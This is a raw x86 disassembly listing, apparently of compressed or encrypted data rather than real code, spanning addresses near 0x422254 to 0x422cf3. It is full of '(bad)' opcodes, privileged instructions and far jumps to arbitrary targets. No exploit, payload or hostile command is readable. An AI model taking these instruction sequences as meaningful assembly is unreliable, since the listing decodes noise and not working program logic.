  422254:	mov    ebx,0x4788913c
  422259:	dec    esp
  42225a:	or     DWORD PTR [ecx-0x77cd4540],eax
  422260:	aam    0x35
  422262:	div    esi
  422264:	mov    ebx,DWORD PTR [edi+ebx*4]
  422267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422268:	fcom   st(3)
  42226a:	adc    eax,ecx
  42226c:	cli    
  42226d:	xor    BYTE PTR [edi+0x41],bh
  422270:	retf   
  422271:	inc    edi
  422272:	mov    edi,0xeaa8ad95
  422277:	mov    edx,edx
  422279:	dec    ecx
  42227a:	push   ss
  42227b:	and    DWORD PTR [ebx],0xffffffd3
  42227e:	rol    edi,0xbd
  422281:	sbb    eax,0x72efae42
  422286:	adc    DWORD PTR [ecx-0x756be63e],esi
  42228c:	test   BYTE PTR [eax+0x16eb],dl
	...
  4222f2:	add    BYTE PTR [eax],al
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	test   dh,bl
  422302:	push   edi
  422303:	and    bh,BYTE PTR [esp+ebp*2]
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	imul   edi,DWORD PTR [edi],0xffffffd3
  42230f:	xor    edx,DWORD PTR [edi]
  422311:	add    eax,0x963ea404
  422316:	jns    0x4222b1
  422318:	icebp  
  422319:	leave  
  42231a:	(bad)  
  42231b:	shl    DWORD PTR [ebp+0x5d],1
  42231e:	or     eax,0xc156a9e4
  422323:	add    bh,BYTE PTR [esi+0x1f]
  422326:	jg     0x42237e
  422328:	dec    edi
  422329:	add    DWORD PTR [ecx],0x72
  42232c:	add    DWORD PTR ds:0xd8e95fc1,ecx
  422332:	jl     0x4223a6
  422334:	adc    ebp,DWORD PTR [ecx]
  422336:	aad    0x26
  422338:	inc    edi
  422339:	sbb    ebp,DWORD PTR [esi-0x27]
  42233c:	sbb    al,0x11
  42233e:	call   0xbad3c661
  422343:	add    BYTE PTR [esi-0x6c],bl
  422346:	loopne 0x4222ed
  422348:	and    ch,BYTE PTR [ecx+0x211d1506]
  42234e:	inc    esi
  42234f:	sub    al,0xda
  422351:	fwait
  422352:	xor    esi,ebp
  422354:	jb     0x422323
  422356:	mov    cl,cl
  422358:	test   BYTE PTR [edi+0x2cb94313],0xfd
  42235f:	(bad)  
  422361:	int3   
  422362:	inc    edx
  422363:	xchg   dh,ah
  422365:	(bad)  
  422366:	sub    edi,ebp
  422368:	loopne 0x4223e3
  42236a:	adc    al,0xad
  42236c:	jl     0x422377
  42236e:	dec    ecx
  42236f:	fld    TBYTE PTR [eax-0x79]
  422372:	and    eax,0x85410b1c
  422377:	mov    BYTE PTR ds:0x93cab003,al
  42237d:	push   ecx
  42237e:	xor    BYTE PTR [esi-0x79057791],ah
  422384:	ds add esp,DWORD PTR cs:[eiz*4+0x1e44a479]
  42238d:	cld    
  42238e:	adc    eax,0x978a531d
  422393:	inc    ebx
  422394:	aas    
  422395:	shl    BYTE PTR [ebx+0x58106a59],0x95
  42239c:	jno    0x422359
  42239e:	xor    al,0x15
  4223a0:	test   eax,0x1e23a460
  4223a5:	inc    ebp
  4223a6:	sub    BYTE PTR [ecx*2+0x691488c3],0x35
  4223ae:	adc    DWORD PTR [eax-0x53],ecx
  4223b1:	hlt    
  4223b2:	std    
  4223b3:	ins    DWORD PTR es:[edi],dx
  4223b4:	stc    
  4223b5:	mov    ebp,0xccf2e326
  4223ba:	dec    ebx
  4223bb:	arpl   si,si
  4223bd:	arpl   WORD PTR [eax-0x372079e8],di
  4223c3:	fsubr  QWORD PTR [esi]
  4223c5:	jb     0x422347
  4223c7:	adc    al,BYTE PTR [ebx-0x41]
  4223ca:	stos   BYTE PTR es:[edi],al
  4223cb:	dec    esi
  4223cc:	cmp    bh,BYTE PTR [edx-0x67d6ad56]
  4223d2:	out    dx,eax
  4223d3:	pop    edx
  4223d4:	fadd   DWORD PTR [ebx-0x651afea1]
  4223da:	jo     0x42237b
  4223dc:	dec    esp
  4223dd:	pop    ds
  4223de:	fs iret 
  4223e0:	fst    DWORD PTR [ebx-0x25b8b3ef]
  4223e6:	pop    edx
  4223e7:	mov    ebx,0x531b4315
  4223ec:	cdq    
  4223ed:	jae    0x422385
  4223ef:	push   edi
  4223f0:	popa   
  4223f1:	pop    eax
  4223f2:	fcmovu st,st(4)
  4223f4:	jnp    0x42240b
  4223f6:	int    0x5a
  4223f8:	jg     0x422435
  4223fa:	mov    es,WORD PTR [esi]
  4223fc:	bound  ecx,QWORD PTR [edi]
  4223fe:	sub    cl,dh
  422400:	inc    ecx
  422401:	jmp    0xd6c1:0x52f3251b
  422408:	sahf   
  422409:	cld    
  42240a:	xchg   DWORD PTR [edi],esi
  42240c:	jge    0x422476
  42240e:	int3   
  42240f:	enter  0x0,0x0
	...
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	jmp    0x40fc52c8
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    al,0x1
  42248a:	add    BYTE PTR [eax],al
  42248c:	inc    ecx
  42248d:	cmp    ch,bh
  42248f:	scas   eax,DWORD PTR es:[edi]
  422490:	test   BYTE PTR [ecx+0x46e03031],0x2f
  422497:	lods   al,BYTE PTR ds:[esi]
  422498:	mov    edi,es
  42249a:	push   es
  42249b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42249c:	mov    al,0xbe
  42249e:	in     eax,dx
  42249f:	ror    DWORD PTR [ecx+0x51217d36],1
  4224a5:	and    BYTE PTR [edx],bh
  4224a7:	mov    eax,0xc296e6c8
  4224ac:	inc    esi
  4224ad:	icebp  
  4224ae:	adc    al,0x57
  4224b0:	xor    esi,DWORD PTR [ecx-0x5dbeec0]
  4224b6:	push   ds
  4224b7:	dec    ebx
  4224b8:	addr16 sbb al,0x85
  4224bb:	mov    esi,0x7b27d8db
  4224c0:	jbe    0x4224ec
  4224c2:	mov    dl,0xab
  4224c4:	lock (bad) 
  4224c6:	xlat   BYTE PTR ds:[ebx]
  4224c7:	mov    ecx,0xcca1c550
  4224cc:	mov    cl,0x88
  4224ce:	jo     0x4224c7
  4224d0:	adc    eax,0xf2e3f572
  4224d5:	or     BYTE PTR [esi+esi*8-0x3],dh
  4224d9:	inc    eax
  4224da:	xlat   BYTE PTR ds:[ebx]
  4224db:	sbb    esp,DWORD PTR gs:[edx+0x6cd0a377]
  4224e2:	xor    BYTE PTR [eax+0x31],0x36
  4224e6:	dec    edi
  4224e7:	(bad)  
  4224e9:	mov    al,ds:0xaf014f26
  4224ee:	stos   BYTE PTR es:[edi],al
  4224ef:	std    
  4224f0:	sub    al,0xf3
  4224f2:	mov    esi,0xf50a3174
  4224f7:	inc    edx
  4224f8:	jne    0x4224b2
  4224fa:	rol    BYTE PTR ds:0x1a8d7d02,1
  422500:	lea    ebp,ss:0x1ec89f12
  422507:	fist   DWORD PTR [edi+0x5f807800]
  42250d:	jp     0x422514
  42250f:	xchg   esp,eax
  422510:	sub    dh,BYTE PTR [eax]
  422512:	jns    0x422554
  422514:	cmp    eax,eax
  422516:	(bad)  
  422518:	mov    al,0x35
  42251a:	xchg   DWORD PTR ds:[edx],ebx
  42251d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251e:	dec    esi
  42251f:	mov    bh,0xec
  422521:	mov    ds:0x22b8e05a,eax
  422526:	call   0xf95c:0x16694ee
  42252d:	dec    eax
  42252e:	pop    esi
  42252f:	sub    ebx,DWORD PTR [edx]
  422531:	adc    al,0xc3
  422533:	mov    esp,0xc646433
  422538:	xchg   DWORD PTR [ebp-0x1c],edi
  42253b:	jmp    0xd356bcab
  422540:	pushf  
  422541:	stos   DWORD PTR es:[edi],eax
  422542:	out    0xb,al
  422544:	dec    edx
  422545:	or     eax,0x8ea2200f
  42254a:	xor    ah,bl
  42254c:	sub    eax,0x1088e136
  422551:	inc    edi
  422552:	pop    edi
  422553:	adc    eax,0x9b54ff9a
  422558:	jl     0x422590
  42255a:	scas   eax,DWORD PTR es:[edi]
  42255b:	pop    eax
  42255c:	pop    es
  42255d:	aas    
  42255e:	pop    ds
  42255f:	nop
  422560:	jns    0x4225b9
  422562:	mov    ecx,0xd225e86c
  422567:	dec    esi
  422568:	daa    
  422569:	stos   DWORD PTR es:[edi],eax
  42256a:	enter  0x48c0,0x24
  42256e:	sub    al,BYTE PTR [edi]
  422570:	push   ebp
  422571:	jecxz  0x422570
  422573:	sbb    eax,0x374448e8
  422578:	imul   edx,edi,0x6f
  42257b:	mov    esp,0xd7bd5769
  422580:	fidiv  DWORD PTR [eax]
  422582:	push   ss
  422583:	mov    ebx,0xdf992aa9
  422588:	scas   eax,DWORD PTR es:[edi]
  422589:	loope  0x422532
  42258b:	cmp    eax,DWORD PTR [ecx-0x34]
  42258e:	scas   al,BYTE PTR es:[edi]
  42258f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4225f4:	call   0xfa77:0xbf778fae
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x2ec0a2f8]
  422602:	repnz sub eax,DWORD PTR [esi+ebp*2+0x1]
  422607:	add    BYTE PTR [ecx+eax*1],al
  42260a:	add    BYTE PTR [eax],al
  42260c:	jge    0x4225a2
  42260e:	fcmovb st,st(6)
  422610:	js     0x4225ca
  422612:	rcr    DWORD PTR [ecx+ebp*4-0x47f2ddeb],cl
  422619:	adc    al,0x55
  42261b:	pop    ebx
  42261c:	jb     0x422690
  42261e:	mov    edx,0xa52f3f9c
  422623:	mov    ds:0x477ae9d3,al
  422628:	test   edx,edi
  42262a:	hlt    
  42262b:	pusha  
  42262c:	jne    0x4226a9
  42262e:	test   al,0xb6
  422630:	inc    eax
  422631:	repz je 0x42269a
  422634:	dec    ecx
  422635:	dec    esi
  422636:	or     ah,BYTE PTR [edx+edi*4+0x10]
  42263a:	sbb    eax,0x4e42de52
  42263f:	cmp    ebx,DWORD PTR [edx+0x35cde15d]
  422645:	inc    ecx
  422646:	int    0x3b
  422648:	rcr    dl,cl
  42264a:	inc    eax
  42264b:	dec    edi
  42264c:	jg     0x4225f9
  42264e:	jae    0x42268e
  422650:	jl     0x42267a
  422652:	xor    eax,0xe56fcfdb
  422657:	inc    eax
  422658:	mov    eax,0x330d92ee
  42265d:	mov    dl,0x79
  42265f:	lds    ebp,FWORD PTR [ecx+ecx*1-0x1340c5a9]
  422666:	dec    ebp
  422667:	and    BYTE PTR ds:0xc425e0b7,bl
  42266d:	stos   BYTE PTR es:[edi],al
  42266e:	push   0xffffffeb
  422670:	push   0xe0cdb396
  422675:	push   esi
  422676:	cmp    edi,esp
  422678:	stos   BYTE PTR es:[edi],al
  422679:	cdq    
  42267a:	mov    al,ds:0x3bbec1b
  42267f:	cmovp  edi,DWORD PTR [eax+0x5036bd75]
  422686:	call   0x7432:0xa76d29c1
  42268d:	jle    0x42265e
  42268f:	xchg   esi,eax
  422690:	retf   0x3032
  422693:	cdq    
  422694:	and    esi,DWORD PTR [edi]
  422696:	mov    ebx,0xefc6fb96
  42269b:	in     al,dx
  42269c:	push   ebx
  42269d:	inc    edx
  42269e:	rol    BYTE PTR [esi+0x7d],1
  4226a1:	imul   ebx,DWORD PTR [edx-0x1bfadbf8],0x7f33cae6
  4226ab:	pop    edi
  4226ac:	ja     0x422710
  4226ae:	inc    edx
  4226af:	out    0x37,al
  4226b1:	fcom   QWORD PTR [ebp+0x677d29ee]
  4226b7:	test   eax,0x281ea0e0
  4226bc:	push   edi
  4226bd:	popf   
  4226be:	adc    edx,ebp
  4226c0:	inc    ebx
  4226c1:	cdq    
  4226c2:	shr    BYTE PTR [esi+0x5d],cl
  4226c5:	scas   eax,DWORD PTR es:[edi]
  4226c6:	dec    edx
  4226c7:	repz dec BYTE PTR [eax-0x78]
  4226cb:	xchg   esi,eax
  4226cc:	adc    eax,0xbdcc6689
  4226d1:	mov    dl,0x6e
  4226d3:	and    DWORD PTR [edx-0x68cd3a72],ecx
  4226d9:	daa    
  4226da:	js     0x422663
  4226dc:	adc    al,ch
  4226de:	(bad)  
  4226df:	call   0xbeb323f0
  4226e4:	cmp    esi,DWORD PTR [edi]
  4226e6:	sbb    eax,0x8aef0e46
  4226eb:	inc    ebx
  4226ec:	jae    0x422679
  4226ee:	leave  
  4226ef:	mov    ecx,0x485d01fa
  4226f4:	aaa    
  4226f5:	bound  eax,QWORD PTR [ecx-0x459cd88b]
  4226fb:	push   edx
  4226fc:	test   eax,ebx
  4226fe:	dec    edi
  422700:	enter  0x23d8,0x8f
  422704:	sbb    edx,edx
  422706:	cwde   
  422707:	mov    ch,0x1b
  422709:	sbb    eax,0xc85a3b33
  42270e:	pop    ecx
  42270f:	rol    DWORD PTR [eax],cl
	...
  422771:	add    BYTE PTR [eax],al
  422773:	add    BYTE PTR [edi],ah
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x3f7f01c8
  422781:	fs add eax,0x16f483d
  422787:	add    BYTE PTR [ecx+eax*1],al
  42278a:	add    BYTE PTR [eax],al
  42278c:	add    eax,0xa1c6dedc
  422791:	les    ecx,FWORD PTR [edi-0x24]
  422794:	mov    al,ds:0x7fcc8c1d
  422799:	(bad)  
  42279a:	pop    edx
  42279b:	push   ebp
  42279c:	sbb    ecx,ebp
  42279e:	mov    dh,0x6a
  4227a0:	jle    0x4227c0
  4227a2:	in     al,dx
  4227a3:	inc    ebp
  4227a4:	addr16 je 0x422746
  4227a7:	cld    
  4227a8:	es mov esp,0x4e45e82c
  4227ae:	xchg   ebp,eax
  4227af:	cld    
  4227b0:	jmp    0x5566e87a
  4227b5:	mov    edi,0x52b3a7bf
  4227ba:	pop    es
  4227bb:	xchg   ebp,eax
  4227bc:	je     0x422796
  4227be:	ja     0x4227f4
  4227c0:	(bad)  
  4227c1:	call   ebp
  4227c3:	btc    DWORD PTR [eax],ebp
  4227c6:	fmul   QWORD PTR [eax+0x9]
  4227c9:	in     eax,dx
  4227ca:	icebp  
  4227cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227cc:	mov    ds:0xa396e982,eax
  4227d1:	arpl   WORD PTR [ebx-0x1a80c341],sp
  4227d7:	xchg   edi,eax
  4227d8:	out    dx,al
  4227d9:	call   0xf27dbd26
  4227de:	jne    0x4227f9
  4227e0:	dec    edx
  4227e1:	in     al,0x2d
  4227e3:	fistp  QWORD PTR [ebp-0x37]
  4227e6:	mov    DWORD PTR ds:0xfdaffa13,ecx
  4227ec:	iret   
  4227ed:	test   BYTE PTR [edx+0x7a],bh
  4227f0:	imul   DWORD PTR [edi+0x14]
  4227f3:	adc    BYTE PTR [ecx],0xf4
  4227f6:	cwde   
  4227f7:	fisttp QWORD PTR [ebx-0x73be9e80]
  4227fd:	pop    esp
  4227fe:	test   BYTE PTR [ecx+edx*4],al
  422801:	pushf  
  422802:	(bad)  
  422803:	pop    ds
  422804:	(bad)  
  422805:	lods   eax,DWORD PTR ds:[esi]
  422806:	(bad)  
  422808:	sbb    eax,0x6bb7b709
  42280d:	mov    dh,0x6c
  42280f:	adc    ebp,DWORD PTR [ecx-0x2673b504]
  422815:	jmp    0x422880
  422817:	loop   0x4227d2
  422819:	pusha  
  42281a:	loopne 0x4227e9
  42281c:	bsf    edx,DWORD PTR [esi]
  42281f:	fs in  eax,0xc3
  422822:	mov    edx,0x541f2953
  422827:	mov    bh,BYTE PTR [ebx]
  422829:	pusha  
  42282a:	sub    DWORD PTR [ebp+eax*2-0x754380d],ebp
  422831:	or     ebx,DWORD PTR [ecx+0x2a]
  422834:	loopne 0x42285f
  422836:	ins    BYTE PTR es:[edi],dx
  422837:	xor    eax,0xf2440bb9
  42283c:	inc    eax
  42283d:	jg     0x422855
  42283f:	cmp    BYTE PTR [edx-0x354dc72d],bl
  422845:	aam    0xb1
  422847:	(bad)  
  422849:	jnp    0x4227e1
  42284b:	mov    edx,0x8ca3bd35
  422850:	mov    ds:0x2ade1fae,eax
  422855:	or     BYTE PTR [ecx+0x38b3597f],al
  42285b:	and    DWORD PTR [ebx-0x64],ebp
  42285e:	or     edi,DWORD PTR [ebp+edi*4+0x39]
  422862:	jp     0x4227fd
  422864:	pop    esp
  422865:	lock pop ecx
  422867:	sahf   
  422868:	int3   
  422869:	mov    ds:0x69d3bec4,al
  42286e:	adc    dh,BYTE PTR [edx-0x4691ee02]
  422874:	mov    ds:0x3d1ab602,al
  422879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42287a:	mov    WORD PTR cs:[eax+0x5c],gs
  42287e:	cdq    
  42287f:	in     eax,0x8d
  422881:	(bad)  
  422882:	adc    ah,dh
  422884:	push   0xfffffffc
  422886:	call   0xa894000a
  42288b:	mov    bl,0xee
  42288d:	fdivrp st(6),st
  42288f:	xlat   BYTE PTR ds:[ebx]
	...
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x4228a6
  422901:	dec    esp
  422902:	cdq    
  422903:	adc    ecx,DWORD PTR [eax+esi*2+0x1]
  422907:	add    BYTE PTR [ecx+eax*1],al
  42290a:	add    BYTE PTR [eax],al
  42290c:	jnp    0x4228f5
  42290e:	adc    esi,0xa4a0fdd5
  422914:	sahf   
  422915:	mov    al,ds:0xf267d1cf
  42291a:	jp     0x42289e
  42291c:	rcl    edx,0x4b
  42291f:	sub    eax,ebp
  422921:	inc    ebp
  422922:	mov    al,0x48
  422924:	pop    edi
  422925:	add    DWORD PTR ds:0x84916da7,esp
  42292b:	leavew 
  42292d:	test   BYTE PTR [ebx],bl
  42292f:	fild   DWORD PTR [ebx]
  422931:	dec    edx
  422932:	je     0x422946
  422934:	in     al,0xb9
  422936:	popf   
  422937:	cmp    BYTE PTR [ecx+0x3ee79275],0xbb
  42293e:	mov    al,0xa7
  422940:	outs   dx,DWORD PTR ds:[esi]
  422941:	cdq    
  422942:	add    dh,bl
  422944:	sub    al,0xb0
  422946:	mov    eax,0x14c4d51a
  42294b:	outs   dx,DWORD PTR ds:[esi]
  42294c:	(bad)  
  42294d:	cmp    al,0x4c
  42294f:	push   esi
  422950:	adc    al,0xf1
  422952:	push   edx
  422953:	inc    ecx
  422954:	push   esp
  422955:	mov    edx,0x5d1ea46
  42295a:	dec    esp
  42295b:	dec    ebp
  42295c:	pop    ss
  42295d:	(bad)  
  42295e:	aaa    
  42295f:	call   0xa211:0xbb58934a
  422966:	jecxz  0x422963
  422968:	mov    DWORD PTR [ebx+0x4569dc12],esp
  42296e:	mov    DWORD PTR [eax-0x58],eax
  422971:	sub    BYTE PTR [edx-0x7b],dl
  422974:	dec    eax
  422975:	cmp    BYTE PTR [ebp+0x3b],cl
  422978:	imul   esi,DWORD PTR [edx+eax*4],0xc8b23762
  42297f:	and    esi,DWORD PTR [esi+eax*2]
  422982:	mov    ah,0xef
  422984:	mov    al,ds:0x30d85439
  422989:	sub    DWORD PTR [edx],esi
  42298b:	repnz clc 
  42298d:	mov    esp,ebx
  42298f:	loope  0x4229ac
  422991:	cmc    
  422992:	retf   
  422993:	sub    BYTE PTR [ebx-0x29159df],0xd5
  42299a:	xchg   ecx,eax
  42299b:	outs   dx,DWORD PTR ds:[esi]
  42299c:	shl    DWORD PTR [edi-0x7b],1
  42299f:	sbb    eax,0x3c377000
  4229a4:	dec    esp
  4229a5:	outs   dx,BYTE PTR ds:[esi]
  4229a6:	cmp    al,0x2a
  4229a8:	jmp    0x207:0x7422a528
  4229af:	ins    DWORD PTR es:[edi],dx
  4229b0:	push   edi
  4229b1:	mov    WORD PTR [edx-0x1b],es
  4229b4:	pusha  
  4229b5:	mov    ds:0x2ae38876,al
  4229ba:	jae    0x4229e8
  4229bc:	leave  
  4229bd:	les    ebx,FWORD PTR [edi-0x70]
  4229c0:	cmp    bl,bl
  4229c2:	ds int 0xb3
  4229c5:	adc    eax,ecx
  4229c7:	xchg   esi,eax
  4229c8:	cdq    
  4229c9:	loope  0x42298c
  4229cb:	ret    0xec34
  4229ce:	push   es
  4229cf:	(bad)  
  4229d0:	mov    al,0x75
  4229d2:	aad    0x4b
  4229d4:	sub    al,0x69
  4229d6:	loopne 0x422a16
  4229d8:	jecxz  0x422a11
  4229da:	aas    
  4229db:	sub    eax,0x5939f9c0
  4229e0:	jp     0x4229dc
  4229e2:	jo     0x422965
  4229e4:	adc    BYTE PTR [edx+0x6b31cd7a],dh
  4229ea:	nop
  4229eb:	push   edx
  4229ec:	pop    ebx
  4229ed:	(bad)  
  4229ee:	and    DWORD PTR [ecx],ebx
  4229f0:	int3   
  4229f1:	fisubr WORD PTR [ecx]
  4229f3:	pop    esp
  4229f4:	lea    edx,es:[esi]
  4229f7:	repz sti 
  4229f9:	rol    BYTE PTR [ebp+0x73],1
  4229fc:	push   0x67423467
  422a01:	adc    DWORD PTR [edi+0x2aa95550],edx
  422a07:	rol    BYTE PTR [ebx+0x5399f7b],0xb4
  422a0e:	ror    DWORD PTR [edi],cl
	...
  422a74:	xchg   esi,eax
  422a75:	push   0x18
  422a77:	mov    ah,bh
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	imul   esi,DWORD PTR [edi],0x715066a9
  422a86:	add    DWORD PTR [eax],eax
  422a88:	add    al,0x1
  422a8a:	add    BYTE PTR [eax],al
  422a8c:	cwde   
  422a8d:	clc    
  422a8e:	jmp    0x422a99
  422a90:	ret    
  422a91:	and    edi,DWORD PTR [eax]
  422a93:	mov    bh,0xcc
  422a95:	fdivr  DWORD PTR [esi-0x27]
  422a98:	pushf  
  422a99:	dec    ebp
  422a9a:	clc    
  422a9b:	mov    dh,0x9a
  422a9d:	push   ebp
  422a9e:	std    
  422a9f:	(bad)  
  422aa0:	out    0xb8,eax
  422aa2:	push   0x29174a0f
  422aa7:	sub    al,0xbf
  422aa9:	or     al,BYTE PTR [edi+ebx*8+0x72]
  422aad:	adc    edx,0x17
  422ab0:	inc    esp
  422ab1:	les    ebp,FWORD PTR [ebp+0x1b1f374]
  422ab7:	jmp    0x422a67
  422ab9:	mov    al,ds:0x1ab8456e
  422abe:	jecxz  0x422b33
  422ac0:	mov    ds:0xb9a16fe0,al
  422ac5:	imul   DWORD PTR ds:0xba44e959
  422acb:	in     eax,dx
  422acc:	rol    BYTE PTR [ebx+eiz*8],1
  422acf:	adc    al,0x6c
  422ad1:	sbb    DWORD PTR [ecx-0x72],ebx
  422ad4:	bound  edi,QWORD PTR ds:0x9fc9a594
  422ada:	sbb    dh,0x91
  422add:	gs addr16 xor eax,0x256eb120
  422ae4:	push   ebp
  422ae5:	xor    eax,0x9b22151c
  422aea:	sbb    al,0xac
  422aec:	in     al,dx
  422aed:	pop    esp
  422aee:	test   DWORD PTR fs:[edx+edx*4],eax
  422af2:	xchg   ecx,eax
  422af3:	ret    
  422af4:	jbe    0x422b27
  422af6:	mov    al,0x5d
  422af8:	(bad)  
  422af9:	add    ah,dl
  422afb:	out    0x1b,al
  422afd:	inc    edx
  422afe:	adc    cl,al
  422b00:	mov    BYTE PTR [ebp-0x63],ch
  422b03:	std    
  422b04:	jge    0x422ae9
  422b06:	inc    esi
  422b07:	add    al,0x6c
  422b09:	jg     0x422a9e
  422b0b:	xor    ebp,DWORD PTR [edx+0x2]
  422b0e:	xor    esp,DWORD PTR [edi]
  422b10:	mov    bh,BYTE PTR [esi-0x12698fdb]
  422b16:	push   edx
  422b17:	sbb    al,0xd4
  422b19:	idiv   DWORD PTR [ecx+eiz*4-0x6d1b9413]
  422b20:	inc    edx
  422b21:	retf   
  422b22:	jp     0x422b5a
  422b24:	sub    DWORD PTR [esi-0x35],ebx
  422b27:	sub    al,0xa8
  422b29:	aad    0xf2
  422b2b:	popa   
  422b2c:	scas   eax,DWORD PTR es:[edi]
  422b2d:	cmc    
  422b2e:	xor    ch,BYTE PTR [ecx-0x375cce7a]
  422b34:	push   eax
  422b35:	pusha  
  422b36:	pop    ds
  422b37:	dec    eax
  422b38:	ss jg  0x422b1a
  422b3b:	pusha  
  422b3c:	shl    BYTE PTR [ebx],cl
  422b3e:	sbb    DWORD PTR [ecx-0x79d470ae],edx
  422b44:	add    eax,0xee0a5746
  422b49:	iret   
  422b4a:	dec    ebx
  422b4b:	push   cs
  422b4c:	fwait
  422b4d:	sbb    bh,BYTE PTR [ecx+0x63]
  422b50:	ret    0x5ee2
  422b53:	lods   al,BYTE PTR ds:[esi]
  422b54:	pop    edx
  422b55:	sbb    al,0x54
  422b57:	bound  edi,QWORD PTR [esi]
  422b59:	xchg   ebp,eax
  422b5a:	pop    ebp
  422b5b:	add    bh,ah
  422b5d:	repnz and si,WORD PTR [ecx+0x4ae33c5e]
  422b65:	mov    bh,bl
  422b67:	mov    WORD PTR [esi],fs
  422b69:	cmp    ebp,DWORD PTR [esp+esi*1+0x52]
  422b6d:	retf   0xa6f4
  422b70:	adc    al,0xb2
  422b72:	enter  0x1cf,0x7d
  422b76:	ins    DWORD PTR es:[edi],dx
  422b77:	cwde   
  422b78:	inc    ebp
  422b79:	xor    al,0xda
  422b7b:	sub    DWORD PTR [esi+0x48e2cbd4],eax
  422b81:	ds push es
  422b83:	fcomp  DWORD PTR [esp+edx*2-0x10]
  422b87:	fucomp st(3)
  422b89:	xchg   edi,eax
  422b8a:	stc    
  422b8b:	xor    ebp,DWORD PTR [esp+edi*8+0x68]
  422b8f:	cli    
	...
  422bf4:	inc    esp
  422bf5:	aaa    
  422bf6:	dec    edx
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x4d73b264]
  422c02:	js     0x422c6d
  422c04:	push   esp
  422c05:	jb     0x422c08
  422c07:	add    BYTE PTR [ecx+eax*1],al
  422c0a:	add    BYTE PTR [eax],al
  422c0c:	jno    0x422c08
  422c0e:	sbb    eax,0x9f184854
  422c13:	pop    ecx
  422c14:	stc    
  422c15:	cmp    DWORD PTR gs:[edx+0x24d5d145],ebx
  422c1c:	aas    
  422c1d:	out    0x6a,eax
  422c1f:	mov    bh,0x69
  422c21:	scas   eax,DWORD PTR es:[edi]
  422c22:	shl    BYTE PTR [edx+0x983b91],cl
  422c28:	cli    
  422c29:	les    eax,FWORD PTR [ecx+eax*8]
  422c2c:	cli    
  422c2d:	call   0xaa2db468
  422c32:	int3   
  422c33:	xor    al,0x13
  422c35:	pop    esp
  422c36:	clc    
  422c37:	fwait
  422c38:	in     eax,dx
  422c39:	test   DWORD PTR [ebp+0x48a1d01a],ebp
  422c3f:	push   cs
  422c40:	add    bh,ah
  422c42:	sbb    bl,BYTE PTR [edx+0x7faf7d5c]
  422c48:	cmp    eax,0xb75c0841
  422c4d:	dec    DWORD PTR [esi-0xc]
  422c50:	mov    WORD PTR [edi+0x4e],ds
  422c53:	push   es
  422c54:	cmc    
  422c55:	sub    eax,DWORD PTR [esi-0x47eb9b07]
  422c5b:	jno    0x422c59
  422c5d:	mov    ds:0x633101cb,eax
  422c62:	push   ecx
  422c63:	call   0x74a10d3a
  422c68:	mov    ecx,0xb4fc6fb9
  422c6d:	cmp    eax,0x59a5505a
  422c72:	push   cs
  422c73:	mov    eax,0xa632b061
  422c78:	dec    ebx
  422c79:	mov    ebx,DWORD PTR [ebp-0x2]
  422c7c:	pop    edx
  422c7d:	dec    ebp
  422c7e:	shr    BYTE PTR [ebx+eax*1+0x46],0x3b
  422c83:	scas   eax,DWORD PTR es:[edi]
  422c84:	jmp    0x5b781e83
  422c89:	cmp    ecx,DWORD PTR [ecx]
  422c8b:	fs push eax
  422c8d:	inc    ecx
  422c8e:	xchg   ebp,eax
  422c8f:	pop    es
  422c90:	daa    
  422c91:	fwait
  422c92:	mov    bl,0x9b
  422c94:	test   al,0xef
  422c96:	stos   BYTE PTR es:[edi],al
  422c97:	mov    ebp,0xa292754a
  422c9c:	add    BYTE PTR [eax],dl
  422c9e:	push   ss
  422c9f:	jbe    0x422c97
  422ca1:	lea    esp,ds:0xe49c1351
  422ca7:	mov    ah,0x2f
  422ca9:	jmp    0x6e0:0xa7508998
  422cb0:	mov    ebp,0x52f11056
  422cb5:	adc    bh,bh
  422cb7:	push   edi
  422cb8:	test   al,0xf
  422cba:	cpuid  
  422cbc:	cmp    BYTE PTR [ebx-0x466fa55a],ch
  422cc2:	int3   
  422cc3:	inc    ebx
  422cc4:	cmc    
  422cc5:	mov    edx,DWORD PTR [edx]
  422cc7:	in     al,0x81
  422cc9:	loopne 0x422c4b
  422ccb:	sar    BYTE PTR [ebx-0x61],cl
  422cce:	xor    al,0x5d
  422cd0:	inc    eax
  422cd1:	fld    TBYTE PTR ds:0x5b6ed2dd
  422cd7:	mov    cl,0x65
  422cd9:	sub    DWORD PTR [ebx],ebp
  422cdb:	scas   al,BYTE PTR es:[edi]
  422cdc:	xor    ebx,0xffffffd5
  422cdf:	sbb    ebx,DWORD PTR [edx+0x13]
  422ce2:	mov    ecx,0x16c94e12
  422ce7:	outs   dx,DWORD PTR ds:[esi]
  422ce8:	cmp    dl,BYTE PTR [edx+0x34]
  422ceb:	mov    edi,0xff90f200
  422cf0:	xchg   esp,eax
  422cf1:	xor    edx,DWORD PTR [edx]
  422cf3:	into   
